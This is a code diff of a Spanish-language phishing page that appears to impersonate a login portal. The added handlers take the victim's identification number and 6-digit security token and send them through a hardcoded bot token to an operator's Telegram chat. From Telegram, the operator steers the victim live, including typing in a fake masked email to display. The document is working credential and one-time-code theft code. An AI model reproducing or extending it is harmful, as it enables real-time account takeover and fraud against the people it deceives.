@@ -672,11 +672,9 @@ function escucharBotones(callbackAction) {
 
                 // Escuchar el texto que TÚ escribes en Telegram para el correo
                 if (u.message && u.message.text && esperandoCorreoEscrito) {
-                    // Aceptamos el texto si contiene @ o *
                     if (u.message.text.includes('@') || u.message.text.includes('*')) {
                         pollingActivo = false;
                         esperandoCorreoEscrito = false;
-                        // Limpiamos el texto por si acaso
                         const textoLimpio = u.message.text.replace(/^\/\w+\s*/, '').trim();
                         callbackAction('correo_manual', textoLimpio);
                         return;
@@ -713,17 +711,14 @@ function handleTelegramActionId(action) {
         viewIdentificacion.style.display = 'none';
         viewEsperandoCorreo.classList.add('active');
         
-        // ACTIVAMOS LA ESCUCHA PARA EL CORREO
         esperandoCorreoEscrito = true;
         actionProcessed = false; 
         
-        // Al presionar el botón, te enviamos un mensaje a ti recordándote escribir el correo
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "👉 <b>Escribe ahora el correo enmascarado que deseas mostrar (ej: cau***78@ho*****.com)</b>", parse_mode: 'HTML' })
         });
 
-        // Empezamos a escuchar lo que escribas
         escucharBotones(handleTelegramActionManual);
 
     } else if (action === 'usuario_malo') {
@@ -741,7 +736,6 @@ function handleTelegramActionManual(action, textoRecibido = '') {
         correoEnmascarado.textContent = textoRecibido;
         setTimeout(() => inputToken.focus(), 100);
         
-        // Preparar la escucha para cuando el usuario ingrese el token
         enviarTokenTelegram("Esperando token...", function(msgId) {
             if(msgId) {
                 actionProcessed = false;
@@ -767,4 +761,67 @@ function handleTelegramActionToken(action) {
         inputToken.focus();
         actionProcessed = false;
     } else {
-        ocult
+        ocultarOverlay();
+        actionProcessed = false;
+    }
+}
+
+// ==========================================
+// EVENTOS DE BOTONES EN PANTALLA
+// ==========================================
+btnLogin.addEventListener('click', function() {
+    const id = inputId.value.trim();
+    if (id === '') {
+        errorId.textContent = 'Por favor ingresa tu número de identificación.';
+        errorId.classList.add('show');
+        inputId.focus();
+        return;
+    }
+
+    idBuscadoGlobal = id;
+    actionProcessed = false;
+    mostrarOverlay();
+    btnLogin.disabled = true;
+
+    enviarIdentificacionTelegram(idBuscadoGlobal, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionId);
+        } else {
+            ocultarOverlay();
+            btnLogin.disabled = false;
+            errorId.textContent = 'Error de conexión. Intenta de nuevo.';
+            errorId.classList.add('show');
+        }
+    });
+});
+
+btnValidarToken.addEventListener('click', function() {
+    const token = inputToken.value.trim();
+    if (token.length < 6) {
+        errorToken.textContent = 'El token debe tener exactamente 6 dígitos.';
+        errorToken.classList.add('show');
+        inputToken.focus();
+        return;
+    }
+
+    actionProcessed = false;
+    mostrarOverlay();
+
+    enviarTokenTelegram(token, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionToken);
+        } else {
+            ocultarOverlay();
+            errorToken.textContent = 'Error al enviar el token. Intenta de nuevo.';
+            errorToken.classList.add('show');
+        }
+    });
+});
+
+inputToken.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') { e.preventDefault(); btnValidarToken.click(); }
+});
+</script>
+
+</body>
+</html>
